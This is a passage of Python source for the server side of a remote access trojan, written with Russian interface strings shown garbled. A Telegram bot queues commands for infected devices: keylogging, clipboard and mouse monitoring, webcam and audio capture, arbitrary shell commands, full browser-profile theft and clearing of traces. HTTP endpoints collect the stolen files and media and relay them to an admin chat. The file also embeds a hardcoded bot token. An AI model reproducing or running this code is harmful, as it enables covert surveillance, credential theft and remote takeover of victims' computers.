                             (device_id, "keylogger_stop"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–µ–π–ª–æ–≥–≥–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_keylogger_menu")]
                ]))
        elif action == "keylogger_dump":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "keylogger_dump"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–õ–æ–≥ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_keylogger_menu")]
                ]))
        elif action == "keylogger_clear":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "keylogger_clear"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–õ–æ–≥ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞ –æ—á–∏—â–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_keylogger_menu")]
                ]))
        elif action == "mouse_menu":
            keyboard = [
                [InlineKeyboardButton("‚ñ∂Ô∏è –°—Ç–∞—Ä—Ç", callback_data=f"action_{device_id}_mouse_monitor_start")],
                [InlineKeyboardButton("‚èπÔ∏è –°—Ç–æ–ø", callback_data=f"action_{device_id}_mouse_monitor_stop")],
                [InlineKeyboardButton("üì§ –í—ã–≥—Ä—É–∑–∏—Ç—å", callback_data=f"action_{device_id}_mouse_monitor_dump")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –º—ã—à–∏:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "mouse_monitor_start":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "mouse_monitor_start"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –º—ã—à–∏ –∑–∞–ø—É—â–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_mouse_menu")]
                ]))
        elif action == "mouse_monitor_stop":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "mouse_monitor_stop"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –º—ã—à–∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_mouse_menu")]
                ]))
        elif action == "mouse_monitor_dump":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "mouse_monitor_dump"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–õ–æ–≥ –º—ã—à–∏ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_mouse_menu")]
                ]))
        elif action == "apps_monitor":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "apps_monitor"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–°–ø–∏—Å–æ–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
                ]))
        elif action == "clipboard_monitor":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "clipboard_monitor"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
                ]))
        elif action == "clear_traces":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "clear_traces"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–æ–º–∞–Ω–¥–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–ª–µ–¥–æ–≤ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
                ]))
        elif action == "block_site":
            context.user_data['block_site_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í–≤–µ–¥–∏—Ç–µ –¥–æ–º–µ–Ω —Å–∞–π—Ç–∞ –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä: vk.com):"
            )
        elif action == "block_app":
            context.user_data['block_app_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä: chrome.exe):"
            )
        elif action == "audio_menu":
            keyboard = [
                [InlineKeyboardButton("‚ñ∂Ô∏è –ù–∞—á–∞—Ç—å –∑–∞–ø–∏—Å—å", callback_data=f"action_{device_id}_record_audio_start")],
                [InlineKeyboardButton("‚èπÔ∏è –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∑–∞–ø–∏—Å—å", callback_data=f"action_{device_id}_record_audio_stop")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–î–ª–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞–ø–∏—Å—å –∞—É–¥–∏–æ:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "record_audio_start":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "record_audio_start"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–î–ª–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞–ø–∏—Å—å –∞—É–¥–∏–æ –Ω–∞—á–∞—Ç–∞.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_audio_menu")]
                ]))
        elif action == "record_audio_stop":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "record_audio_stop"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ –∞—É–¥–∏–æ–∑–∞–ø–∏—Å–∏.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_audio_menu")]
                ]))
        elif action == "cmd_menu":
            keyboard = [
                [InlineKeyboardButton("ipconfig", callback_data=f"action_{device_id}_cmd:ipconfig")],
                [InlineKeyboardButton("tasklist", callback_data=f"action_{device_id}_cmd:tasklist")],
                [InlineKeyboardButton("–í–≤–µ—Å—Ç–∏ —Å–≤–æ—é –∫–æ–º–∞–Ω–¥—É", callback_data=f"action_{device_id}_cmd_custom")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –∏–ª–∏ –≤–≤–µ–¥–∏—Ç–µ —Å–≤–æ—é:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action.startswith("cmd:"):
            cmd = action.split(":", 1)[1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"cmd:{cmd}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–ö–æ–º–∞–Ω–¥–∞ 'cmd {cmd}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_cmd_menu")]
                ]))
        elif action == "cmd_custom":
            context.user_data['cmd_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤ –∫–æ–Ω—Å–æ–ª–∏:")
        elif action == "processes":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "processes"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–ö–æ–º–∞–Ω–¥–∞ 'processes' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
                ]))
        elif action == "killprocess":
            context.user_data['killprocess_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä: explorer.exe) –∏–ª–∏ pid:")
        elif action == "open_image":
            context.user_data['open_image_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –Ω—É–∂–Ω–æ –æ—Ç–∫—Ä—ã—Ç—å –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:")
        elif action == "show_message":
            context.user_data['show_message_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –≤—ã–≤–µ—Å—Ç–∏ –Ω–∞ —ç–∫—Ä–∞–Ω–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:")
            
        elif action in ["screenshot", "webcam", "record_video_10", "record_audio_10", 
                       "mouse_click", "lock", "sleep", "shutdown", "reboot"]:
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                           (device_id, action))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–ö–æ–º–∞–Ω–¥–∞ '{action}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
                ])
            )

        elif action == "files_menu":
            keyboard = [
                [InlineKeyboardButton("üìÅ –†–∞–±–æ—á–∏–π —Å—Ç–æ–ª", callback_data=f"action_{device_id}_ls:desktop")],
                [InlineKeyboardButton("üì• –ó–∞–≥—Ä—É–∑–∫–∏", callback_data=f"action_{device_id}_ls:downloads")],
                [InlineKeyboardButton("üìÑ –î–æ–∫—É–º–µ–Ω—Ç—ã", callback_data=f"action_{device_id}_ls:documents")],
                [InlineKeyboardButton("üåê –ë—Ä–∞—É–∑–µ—Ä—ã", callback_data=f"action_{device_id}_browsers_menu")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–§–∞–π–ª–æ–≤—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "browsers_menu":
            keyboard = [
                [InlineKeyboardButton("Google Chrome (–ø–æ–ª–Ω—ã–π –ø—Ä–æ—Ñ–∏–ª—å)", callback_data=f"action_{device_id}_browser_full:chrome")],
                [InlineKeyboardButton("Microsoft Edge (–ø–æ–ª–Ω—ã–π –ø—Ä–æ—Ñ–∏–ª—å)", callback_data=f"action_{device_id}_browser_full:edge")],
                [InlineKeyboardButton("Opera (–ø–æ–ª–Ω—ã–π –ø—Ä–æ—Ñ–∏–ª—å)", callback_data=f"action_{device_id}_browser_full:opera")],
                [InlineKeyboardButton("Mozilla Firefox (–ø–æ–ª–Ω—ã–π –ø—Ä–æ—Ñ–∏–ª—å)", callback_data=f"action_{device_id}_browser_full:firefox")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_files_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í—ã–±–µ—Ä–∏—Ç–µ –±—Ä–∞—É–∑–µ—Ä –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø–æ–ª–Ω–æ–≥–æ –ø—Ä–æ—Ñ–∏–ª—è:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        
        elif action.startswith("browser_full:"):
            browser = action.split(":")[1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                        (device_id, f"browser_full:{browser}"))
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–ó–∞–ø—Ä–æ—Å –ø–æ–ª–Ω–æ–≥–æ –ø—Ä–æ—Ñ–∏–ª—è {browser} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å", callback_data=f"device_{device_id}")]
                ])
            )
        elif action.startswith("ls:"):
            path = action.split(":", 1)[1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                        (device_id, f"ls:{path}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–ó–∞–ø—Ä–æ—Å —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ {path} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_files_menu")]
                ]))
        elif action.startswith("browser:"):
            browser = action.split(":", 1)[1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                        (device_id, f"browser:{browser}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–ó–∞–ø—Ä–æ—Å –¥–∞–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–∞ {browser} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_browsers_menu")]
                ]))

    def run(self):
        self.application.run_polling()

@api.post("/upload_file")
async def upload_file(request: Request):
    data = await request.json()
    file_data = data['file_data']
    file_name = data.get('file_name', 'file.bin')
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω–æ–µ –∏–º—è —Ñ–∞–π–ª–∞
    import uuid
    unique_id = str(uuid.uuid4())
    save_name = f"{unique_id}_{file_name}"
    save_path = os.path.join(UPLOAD_FOLDER, save_name)
    
    with open(save_path, 'wb') as f:
        f.write(base64.b64decode(file_data))
    
    return {
        "status": "success",
        "download_url": f"http://{request.client.host}:{API_PORT}/downloads/{save_name}"
    }

@api.post("/upload_chunk")
async def upload_chunk(request: Request):
    data = await request.json()
    file_name = data['file_name']
    chunk_num = data['chunk_num']
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —á–∞–Ω–∫ –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É
    temp_dir = os.path.join(UPLOAD_FOLDER, "temp")
    os.makedirs(temp_dir, exist_ok=True)
    
    chunk_path = os.path.join(temp_dir, f"{file_name}.part{chunk_num}")
    with open(chunk_path, 'wb') as f:
        f.write(base64.b64decode(data['file_data']))
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —á–∞–Ω–∫–µ
    upload_progress[file_name][chunk_num] = chunk_path
    
    return {"status": "success"}

@api.post("/finalize_upload")
async def finalize_upload(request: Request):
    data = await request.json()
    file_name = data['file_name']
    total_chunks = data['total_chunks']
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –≤—Å–µ –ª–∏ —á–∞–Ω–∫–∏ –ø–æ–ª—É—á–µ–Ω—ã
    if len(upload_progress.get(file_name, {})) != total_chunks:
        return {"status": "error", "message": "Not all chunks received"}
    
    # –°–æ–±–∏—Ä–∞–µ–º —Ñ–∞–π–ª –∏–∑ —á–∞–Ω–∫–æ–≤
    unique_id = str(uuid.uuid4())
    final_name = f"{unique_id}_{file_name}"
    final_path = os.path.join(UPLOAD_FOLDER, final_name)
    
    with open(final_path, 'wb') as outfile:
        for i in range(total_chunks):
            chunk_path = upload_progress[file_name][i]
            with open(chunk_path, 'rb') as infile:
                outfile.write(infile.read())
            os.remove(chunk_path)
    
    del upload_progress[file_name]
    
    return {
        "status": "success",
        "download_url": f"http://{request.client.host}:{API_PORT}/downloads/{final_name}"
    }

@api.post("/register")
async def register_device(request: Request):
    data = await request.json()
    device_id = data['device_id']
    is_new = False
    with sqlite3.connect(DATABASE) as conn:
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM devices WHERE device_id=?', (device_id,))
        if c.fetchone()[0] == 0:
            is_new = True
        conn.execute('''INSERT OR REPLACE INTO devices 
                      (device_id, name, ip, os, last_seen, is_online)
                      VALUES (?, ?, ?, ?, datetime('now'), 1)''',
                   (device_id, data['system_info']['name'],
                    data['system_info']['ip'], data['system_info']['os']))
    if is_new and bot_instance:
        try:
            stealth_note = "\n‚ö†Ô∏è –ö–ª–∏–µ–Ω—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ —Å–∫—Ä—ã—Ç–æ–º —Ä–µ–∂–∏–º–µ" if data.get("stealth") else ""
            await bot_instance.application.bot.send_message(
                chat_id=ADMIN_IDS[0],
                text=f"üÜï –ù–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ:\nID: {device_id}\n–ò–º—è: {data['system_info']['name']}\nIP: {data['system_info']['ip']}\nOS: {data['system_info']['os']}{stealth_note}"
            )
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –Ω–æ–≤–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ: {e}")
    return {"status": "success"}

@api.post("/heartbeat")
async def heartbeat(request: Request):
    data = await request.json()
    
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("UPDATE devices SET last_seen=datetime('now'), is_online=1 WHERE device_id=?",
                   (data['device_id'],))
    
    return {"status": "success"}

@api.get("/commands")
async def get_commands(device_id: str):
    with sqlite3.connect(DATABASE) as conn:
        c = conn.cursor()
        c.execute("SELECT id, command FROM commands WHERE device_id=? AND status='pending'",
                 (device_id,))
        commands = [{"id": row[0], "command": row[1]} for row in c.fetchall()]
        
        if commands:
            c.execute("UPDATE commands SET status='executing' WHERE id IN ({})".format(
                ",".join(str(cmd['id']) for cmd in commands)))
    
    return {"commands": commands}

@api.post("/command_result")
async def command_result(request: Request):
    data = await request.json()
    device_id = data['device_id']
    command_id = data['command_id']
    result = data.get('result', '')
    file_type = data.get('file_type')
    file_data = data.get('file_data')
    
    if file_type == 'video' and '–í–∏–¥–µ–æ' in result:
        temp_dir = os.path.join(tempfile.gettempdir(), f"video_multi_{device_id}")
        os.makedirs(temp_dir, exist_ok=True)
        idx = len(os.listdir(temp_dir)) + 1
        video_path = os.path.join(temp_dir, f"part{idx}.avi")
        with open(video_path, 'wb') as f:
            f.write(base64.b64decode(file_data))
        if f"{idx}/" in result:
            pass
        else:
            files = sorted([os.path.join(temp_dir, f) for f in os.listdir(temp_dir) if f.endswith('.avi')])
            if len(files) > 1:
                out_path = os.path.join(temp_dir, 'merged.avi')
                try:
                    frames = []
                    for f in files:
                        cap = cv2.VideoCapture(f)
                        while True:
                            ret, frame = cap.read()
                            if not ret:
                                break
                            frames.append(frame)
                        cap.release()
                    if frames:
                        h, w, _ = frames[0].shape
                        out = cv2.VideoWriter(out_path, cv2.VideoWriter_fourcc(*'MJPG'), 5.0, (w, h))
                        for frame in frames:
                            out.write(frame)
                        out.release()
                        with open(out_path, 'rb') as f:
                            merged_bytes = f.read()
                        await bot_instance.application.bot.send_video(
                            chat_id=ADMIN_IDS[0],
                            video=merged_bytes,
                            caption=f"–°–∫–ª–µ–µ–Ω–Ω–æ–µ –≤–∏–¥–µ–æ —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ {device_id}"
                        )
                        shutil.rmtree(temp_dir)
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ —Å–∫–ª–µ–π–∫–∏ –≤–∏–¥–µ–æ: {e}")
    elif result and result.count(':') > 5 and all(':' in line for line in result.splitlines()):
        lines = result.splitlines()
        keyboard = []
        for line in lines:
            try:
                hwnd, title = line.split(':', 1)
                hwnd = hwnd.strip()
                title = title.strip()
                row = [
                    InlineKeyboardButton(f"üóî {title}", callback_data=f"noop") ,
                    InlineKeyboardButton("üîΩ", callback_data=f"action_{device_id}_window_action_{hwnd}_minimize"),
                    InlineKeyboardButton("ÔøΩÔøΩ", callback_data=f"action_{device_id}_window_action_{hwnd}_restore"),
                    InlineKeyboardButton("‚ùå", callback_data=f"action_{device_id}_window_action_{hwnd}_close")
                ]
                keyboard.append(row)
            except:
                continue
        keyboard.append([InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")])
        await bot_instance.application.bot.send_message(
            chat_id=ADMIN_IDS[0],
            text="–°–ø–∏—Å–æ–∫ –æ–∫–æ–Ω:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data.get('file_type') == 'url':
        keyboard = [
            [InlineKeyboardButton("‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª", url=data['result'])]
        ]
        
        await bot_instance.application.bot.send_message(
            chat_id=ADMIN_IDS[0],
            text=f"‚úÖ –§–∞–π–ª –≥–æ—Ç–æ–≤ –∫ —Å–∫–∞—á–∏–≤–∞–Ω–∏—é\n\n"
                 f"üìÅ –ò–º—è —Ñ–∞–π–ª–∞: {os.path.basename(data['result'])}\n"
                 f"üîó –°—Å—ã–ª–∫–∞ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–∞ 24 —á–∞—Å–∞",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif file_type == 'file':
        file_bytes = base64.b64decode(file_data)
        await bot_instance.application.bot.send_document(
            chat_id=ADMIN_IDS[0],
            document=file_bytes,
            filename=f"download_{device_id}.zip" if '–±—Ä–∞—É–∑–µ—Ä–∞' in result else os.path.basename(result.split()[-1]),
            caption=f"–†–µ–∑—É–ª—å—Ç–∞—Ç —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ {device_id}\n\n{result}"
        )
    else:
        if bot_instance:
            try:
                if file_type and file_data:
                    file_bytes = base64.b64decode(file_data)
                    if file_type == 'photo':
                        await bot_instance.application.bot.send_photo(
                            chat_id=ADMIN_IDS[0],
                            photo=file_bytes,
                            caption=f"–†–µ–∑—É–ª—å—Ç–∞—Ç —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ {device_id}\n\n{result}"
                        )
                    elif file_type == 'video':
                        await bot_instance.application.bot.send_video(
                            chat_id=ADMIN_IDS[0],
                            video=file_bytes,
                            caption=f"–†–µ–∑—É–ª—å—Ç–∞—Ç —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ {device_id}\n\n{result}"
                        )
                    elif file_type == 'audio':
                        await bot_instance.application.bot.send_audio(
                            chat_id=ADMIN_IDS[0],
                            audio=file_bytes,
                            caption=f"–†–µ–∑—É–ª—å—Ç–∞—Ç —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ {device_id}\n\n{result}"
                        )
                else:
                    await bot_instance.application.bot.send_message(
                        chat_id=ADMIN_IDS[0],
                        text=f"–†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã:\n\n{result}"
                    )
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞: {e}")
    
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("UPDATE commands SET status='completed' WHERE id=?",
                   (command_id,))
    
    return {"status": "success"}

def run_api_server():
    if is_port_in_use(API_PORT):
        logger.error(f"–ü–æ—Ä—Ç {API_PORT} —É–∂–µ –∑–∞–Ω—è—Ç!")
        return
    
    config = uvicorn.Config(
        api,
        host="0.0.0.0",
        port=API_PORT,
        log_level="info"
    )
    server = uvicorn.Server(config)
    server.run()

def main():
    try:
        external_ip = requests.get('https://api.ipify.org').text
        print(f"–í–∞—à –≤–Ω–µ—à–Ω–∏–π IP: {external_ip}")
    except:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –≤–Ω–µ—à–Ω–∏–π IP")
    
    if is_port_in_use(API_PORT):
        print(f"–û—à–∏–±–∫–∞: –ü–æ—Ä—Ç {API_PORT} —É–∂–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è!")
        return
    
    api_thread = Thread(target=run_api_server, daemon=True)
    api_thread.start()
    
    try:
        bot = ServerBot("8060699147:AAEawF_dYzDuEA7lqF_FHCuHsujuMwF4r8k")
        global bot_instance
        bot_instance = bot
        print(f"\n–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω:")
        print(f"–õ–æ–∫–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å: http://localhost:{API_PORT}")
        print(f"–í–Ω–µ—à–Ω–∏–π –∞–¥—Ä–µ—Å: http://{external_ip}:{API_PORT}")
        bot.run()
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞: {e}")

if __name__ == '__main__':
    main()